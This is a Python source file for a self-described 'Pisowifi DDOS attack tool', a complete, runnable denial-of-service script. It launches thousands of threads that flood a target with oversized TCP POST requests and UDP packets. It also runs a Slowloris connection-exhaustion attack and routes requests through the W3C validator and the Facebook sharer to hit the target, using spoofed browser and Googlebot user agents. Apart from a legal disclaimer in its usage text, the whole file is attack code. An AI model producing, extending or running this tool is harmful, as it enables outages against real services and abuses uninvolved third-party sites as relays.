#!/usr/bin/python3
# -*- coding: utf-8 -*-

from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random,ssl,os

def user_agent():
    global uagent
    uagent=[]
    uagent.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS) (compatible; Googlebot-Mobile/2.1; http://www.google.com/bot.html)")
    uagent.append("Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 OPR/85.0.4341.72")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5026.0 Safari/537.36 Edg/103.0.1254.0")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15")
    uagent.append("Mozilla/5.0 (X11; Linux i686; rv:97.0) Gecko/20100101 Firefox/97.0")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0")
    uagent.append("Mozilla/5.0 (Android 12; Mobile; rv:97.0) Gecko/97.0 Firefox/97.0")
    uagent.append("Mozilla/5.0 (X11; FreeBSD amd64; rv:87.0) Gecko/20100101 Firefox/87.0")
    uagent.append("Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36")
    uagent.append("Mozilla/5.0 (X11; CrOS aarch64 14526.89.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.133 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/101.0.1210.39")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36")
    uagent.append("Googlebot-Image/1.0")
    return(uagent)

def my_bots():
    global bots
    bots=[]
    bots.append("http://validator.w3.org/check?uri=")
    bots.append("http://www.facebook.com/sharer/sharer.php?u=")
    return(bots)

def generate_massive_payload():
    chunk_size = random.randint(16384, 65535)
    massive_data = os.urandom(chunk_size)
    return massive_data

def generate_http_flood_payload():
    chunk_size = random.randint(65536, 1048576)
    payload = os.urandom(chunk_size)
    http_headers = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {random.choice(uagent)}\r\n"
        "Accept: */*\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Accept-Language: en-US,en;q=0.9\r\n"
        "Cache-Control: no-cache\r\n"
        f"Content-Length: {len(payload)}\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Connection: keep-alive\r\n\r\n"
    ).encode('utf-8') + payload
    return http_headers

def bot_hammering(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}), timeout=5)
            print("\033[94mbot is running...\033[0m")
            time.sleep(.01)
    except:
        time.sleep(.01)

def down_it(item):
    sock = None
    try:
        while True:
            payload = generate_http_flood_payload()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
            sock.settimeout(3)
            sock.connect((host, int(port)))
            sock.sendall(payload)
            try:
                sock.settimeout(0.01)
                sock.recv(4096)
            except:
                pass
            print("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--MASSIVE PACKET SENT--> \033[0m \033[91m[", len(payload), "bytes]\033[0m")
            try:
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
            except:
                pass
            sock = None
            time.sleep(.01)
    except socket.error:
        if sock:
            try:
                sock.close()
            except:
                pass
        print("\033[91mno connection! server overloaded\033[0m")
        time.sleep(.01)
    except Exception:
        if sock:
            try:
                sock.close()
            except:
                pass
        time.sleep(.01)

def udp_flood():
    udp_sock = None
    try:
        while True:
            payload = generate_massive_payload()
            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
            udp_sock.sendto(payload, (host, int(port)))
            print("\033[92m",time.ctime(time.time()),"\033[0m \033[95m <--UDP FLOOD--> \033[0m \033[91m[", len(payload), "bytes]\033[0m")
            udp_sock.close()
            udp_sock = None
            time.sleep(.001)
    except socket.error:
        if udp_sock:
            try:
                udp_sock.close()
            except:
                pass
        time.sleep(.001)
    except Exception:
        if udp_sock:
            try:
                udp_sock.close()
            except:
                pass
        time.sleep(.001)

def slowloris_attack():
    sockets_list = []
    try:
        for _ in range(500):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((host, int(port)))
                s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(uagent)}\r\nAccept: text/html\r\n".encode('utf-8'))
                sockets_list.append(s)
                print("\033[92m",time.ctime(time.time()),"\033[0m \033[93m <--Slowloris connection established-->\033[0m")
            except:
                pass
        while True:
            for s in list(sockets_list):
                try:
                    s.send(f"X-Header: {random.choice(uagent)}\r\n".encode('utf-8'))
                    print("\033[92m",time.ctime(time.time()),"\033[0m \033[93m <--Slowloris keep-alive-->\033[0m")
                except:
                    sockets_list.remove(s)
                    try:
                        new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_s.settimeout(5)
                        new_s.connect((host, int(port)))
                        new_s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(uagent)}\r\nAccept: text/html\r\n".encode('utf-8'))
                        sockets_list.append(new_s)
                    except:
                        pass
            time.sleep(10)
    except:
        for s in sockets_list:
            try:
                s.close()
            except:
                pass

def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()

def dos2():
    while True:
        item = w.get()
        bot_hammering(random.choice(bots) + "http://" + host)
        w.task_done()

def dos3():
    while True:
        item = e.get()
        udp_flood()
        e.task_done()

def usage():
    print(''' \033[92m    
 Pisowifi DDOS attack tool
    
Misuse may result in severe legal penalties, including fines and imprisonment.
Always obtain explicit permission before testing any system.
By using this tool, you agree to comply with all applicable laws and assume full responsibility for your actions. \n
    
 usage : python Ddos.py [-s] [-p] [-t] [-m]
    -h : help
    -s : server ip
    -p : port default 80
    -t : turbo default 2000
    -m : mode (tcp/udp/both/all) default all \033[0m''')
    sys.exit()

def get_parameters():
    global host
    global port
    global thr
    global item
    global mode
    optp = OptionParser(add_help_option=False, epilog="Hammers")
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="default 2000 -t 2000")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
    optp.add_option("-m", "--mode", dest="mode", help="tcp/udp/both/all default all")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.turbo is None:
        thr = 2000
    else:
        thr = opts.turbo
    if opts.mode is None:
        mode = "all"
    else:
        mode = opts.mode

global data
try:
    headers = open("headers.txt", "r")
    data = headers.read()
    headers.close()
except:
    data = ""

q = Queue()
w = Queue()
e = Queue()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()
    print("\033[92m", host, " port: ", str(port), " turbo: ", str(thr), " mode: ", mode, "\033[0m")
    print("\033[94mInitializing enhanced attack vectors...\033[0m")
    user_agent()
    my_bots()
    time.sleep(2)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((host, int(port)))
        s.close()
    except socket.error as e:
        print("\033[91mCannot reach target - starting blind attack mode\033[0m")

    print("\033[91m[!] LAUNCHING MAXIMUM POWER ATTACK [!]\033[0m")
    time.sleep(1)

    if mode in ["tcp", "both", "all"]:
        for i in range(int(thr)):
            t = threading.Thread(target=dos)
            t.daemon = True
            t.start()
        print(f"\033[92m[+] {thr} TCP threads deployed\033[0m")

    if mode in ["udp", "both", "all"]:
        for i in range(int(thr/2)):
            t3 = threading.Thread(target=dos3)
            t3.daemon = True
            t3.start()
        print(f"\033[92m[+] {int(thr/2)} UDP threads deployed\033[0m")

    if mode in ["all"]:
        for i in range(int(thr/4)):
            t2 = threading.Thread(target=dos2)
            t2.daemon = True
            t2.start()
        slow_thread = threading.Thread(target=slowloris_attack)
        slow_thread.daemon = True
        slow_thread.start()
        print(f"\033[92m[+] {int(thr/4)} Bot threads + Slowloris deployed\033[0m")

    while True:
        for i in range(int(thr)):
            if mode in ["tcp", "both", "all"]:
                q.put(i)
            if mode in ["udp", "both", "all"]:
                e.put(i)
            if mode in ["all"]:
                w.put(i)
        time.sleep(0.001)
